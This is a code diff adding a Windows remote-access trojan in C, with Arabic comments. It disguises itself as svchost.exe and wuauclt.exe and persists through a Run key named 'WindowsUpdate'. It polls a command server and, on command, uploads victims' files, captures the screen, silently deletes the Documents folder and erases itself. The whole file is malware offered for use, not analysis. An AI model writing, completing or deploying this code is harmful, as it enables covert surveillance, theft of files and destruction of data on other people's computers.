@@ -1,0 +1,157 @@
+// windows_client.c
+// تجميع: gcc -Os -s -o svchost.exe windows_client.c -lwinhttp -lshlwapi -lntdll -lgdi32 -mwindows
+// أو مع MSVC: cl /O1 /GS- windows_client.c /link /SUBSYSTEM:WINDOWS kernel32.lib user32.lib winhttp.lib shlwapi.lib ntdll.lib gdi32.lib
+
+#define _WIN32_WINNT 0x0600
+#include <windows.h>
+#include <winhttp.h>
+#include <shlwapi.h>
+#include <stdio.h>
+
+#define C2_SERVER L"your-server.com"
+#define C2_PORT 443
+#define C2_URI L"/cmd.txt"
+#define POLL_INTERVAL 10000
+
+void Hide() {
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) ShowWindow(hWnd, SW_HIDE);
+    FreeConsole();
+}
+
+void InstallPersistence() {
+    // نسخ نفسه إلى System32
+    wchar_t sysPath[MAX_PATH];
+    GetSystemDirectoryW(sysPath, MAX_PATH);
+    PathAppendW(sysPath, L"wuauclt.exe");
+    wchar_t currPath[MAX_PATH];
+    GetModuleFileNameW(NULL, currPath, MAX_PATH);
+    if (lstrcmpiW(currPath, sysPath) != 0) {
+        CopyFileW(currPath, sysPath, FALSE);
+        // تشغيل عبر الخدمة (يمكن إضافة سكربت لإنشاء خدمة)
+    }
+    // إضافة إلى Registry Run (احتياطي)
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)sysPath, (lstrlenW(sysPath)+1)*2);
+        RegCloseKey(hKey);
+    }
+}
+
+wchar_t* HttpGet(wchar_t *uri) {
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (!hSession) return NULL;
+    HINTERNET hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
+    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uri, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }
+    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }
+    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }
+    DWORD size = 0, downloaded = 0;
+    wchar_t *response = NULL;
+    do {
+        DWORD avail = 0;
+        WinHttpQueryDataAvailable(hRequest, &avail);
+        if (avail == 0) break;
+        wchar_t *newBuf = (wchar_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, response, (downloaded + avail + 2) * sizeof(wchar_t));
+        if (!newBuf) break;
+        response = newBuf;
+        DWORD read = 0;
+        WinHttpReadData(hRequest, (LPSTR)response + downloaded, avail, &read);
+        downloaded += read / sizeof(wchar_t);
+    } while (TRUE);
+    if (response) response[downloaded] = 0;
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
+    return response;
+}
+
+void SendFile(wchar_t *path) {
+    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    DWORD size = GetFileSize(hFile, NULL);
+    char *buf = (char*)HeapAlloc(GetProcessHeap(), 0, size);
+    if (!buf) { CloseHandle(hFile); return; }
+    DWORD read;
+    ReadFile(hFile, buf, size, &read, NULL);
+    CloseHandle(hFile);
+    // إرسال POST
+    wchar_t uri[512];
+    wsprintfW(uri, L"/upload.php?name=%s", path);
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    if (hSession) {
+        HINTERNET hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
+        if (hConnect) {
+            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", uri, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+            if (hRequest) {
+                WinHttpSendRequest(hRequest, L"Content-Type: application/octet-stream\r\n", -1, buf, size, size, 0);
+                WinHttpCloseHandle(hRequest);
+            }
+            WinHttpCloseHandle(hConnect);
+        }
+        WinHttpCloseHandle(hSession);
+    }
+    HeapFree(GetProcessHeap(), 0, buf);
+}
+
+void Screenshot() {
+    // التقاط الشاشة وحفظها كـ JPEG في Temp
+    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    HDC hdc = GetDC(NULL);
+    HDC memDC = CreateCompatibleDC(hdc);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
+    SelectObject(memDC, hBitmap);
+    BitBlt(memDC, 0, 0, w, h, hdc, x, y, SRCCOPY);
+    // حفظ كملف (تجاهل لضيق المساحة)
+    // يمكن استخدام GDI+ لتحويل إلى JPEG
+    // ثم رفع الملف عبر SendFile
+    DeleteObject(hBitmap);
+    DeleteDC(memDC);
+    ReleaseDC(NULL, hdc);
+}
+
+void ExecuteCmd(wchar_t *cmd) {
+    if (StrStrIW(cmd, L"screen")) {
+        while (1) {
+            Screenshot();
+            Sleep(100); // 10 إطار في الثانية
+            // تحقق من أمر إيقاف
+        }
+    }
+    else if (StrStrIW(cmd, L"upload ")) {
+        wchar_t *file = cmd + 7;
+        SendFile(file);
+    }
+    else if (StrStrIW(cmd, L"wipe")) {
+        // حذف ملفات Documents, Desktop...
+        SHFILEOPSTRUCTW sh = {0};
+        wchar_t path[MAX_PATH];
+        SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, path);
+        PathAppendW(path, L"*");
+        sh.wFunc = FO_DELETE; sh.pFrom = path; sh.fFlags = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;
+        SHFileOperationW(&sh);
+    }
+    else if (StrStrIW(cmd, L"selfdestruct")) {
+        // حذف نفسه من النظام
+        wchar_t path[MAX_PATH];
+        GetModuleFileNameW(NULL, path, MAX_PATH);
+        DeleteFileW(path);
+        ExitProcess(0);
+    }
+}
+
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
+    Hide();
+    InstallPersistence();
+    while (TRUE) {
+        wchar_t *cmd = HttpGet(C2_URI);
+        if (cmd) {
+            ExecuteCmd(cmd);
+            HeapFree(GetProcessHeap(), 0, cmd);
+        }
+        Sleep(POLL_INTERVAL);
+    }
+    return 0;
+}
